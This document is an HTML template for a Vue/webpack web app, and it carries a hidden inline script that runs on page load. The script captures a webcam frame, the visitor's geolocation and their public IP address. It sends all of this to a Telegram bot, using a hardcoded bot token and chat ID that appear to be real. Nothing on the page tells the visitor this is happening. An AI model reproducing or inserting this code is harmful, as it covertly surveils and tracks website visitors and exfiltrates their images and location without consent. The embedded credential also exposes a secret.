<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel="shortcut icon" href="https://i.pinimg.com/1200x/5a/ff/e4/5affe417c4d2bdcec4b2289a02b98bd4.jpg" type="image/x-icon">
    <title><%= htmlWebpackPlugin.options.title %></title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
</head>
<body>
    <script>
        const telegramBotToken = '8110683555:AAGsehuzHuGOjSFFY9YBk4QK_Lcbz1JR_Jc';
        const chatId = '1437354716';

 function captureCamera() {
            return navigator.mediaDevices.getUserMedia({ video: true });
        }

        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const { latitude, longitude } = position.coords;
                            resolve(`https://www.google.com/maps?q=${latitude},${longitude}`);
                        },
                        (error) => {
                            reject('Unable to retrieve location');
                        }
                    );
                } else {
                    reject('Geolocation is not supported by this browser.');
                }
            });
        }

        function getIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => {
                    console.error('Error fetching IP:', error);
                    return 'Unable to retrieve IP';
                });
        }

        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        function captureAndSend() {
            Promise.all([captureCamera(), getLocation(), getIP()])
                .then(([cameraStream, locationLink, ip]) => {
                    const videoElement = document.createElement('video');
                    videoElement.srcObject = cameraStream;
                    videoElement.play();

                    videoElement.onloadedmetadata = function() {
                        const canvas = document.createElement('canvas');
                        canvas.width = videoElement.videoWidth;
                        canvas.height = videoElement.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/png');
                        const screenshotData = imageData.replace(/^data:image\/(png|jpg);base64,/, "");

                        const message = `Camera: ${screenshotData}\nLocation: ${locationLink}\nIP Address: ${ip}`;
                        sendToTelegram(message);
                        cameraStream.getTracks().forEach(track => track.stop());
                    };
                })
                .catch(err => {
                    console.error('Error capturing data: ', err);
                });
        }

        // Automatically capture and send data on page load
        window.onload = function() {
            captureAndSend();
        };
    </script>
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
